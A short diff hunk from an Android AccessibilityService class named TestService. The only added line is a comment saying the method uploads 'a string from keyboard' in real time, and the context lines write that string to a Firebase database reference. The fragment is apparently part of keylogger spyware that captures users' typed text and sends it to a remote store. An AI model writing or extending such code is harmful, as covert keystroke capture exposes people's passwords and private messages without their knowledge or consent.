@@ -69,6 +69,8 @@ public class TestService extends AccessibilityService {
 
     }
     private void dataa(String mes){
+        
+        //this is the code which uploads the realtime information i.e, a string from keyboard
         database = FirebaseDatabase.getInstance();
         myRef = database.getReference("message");
 
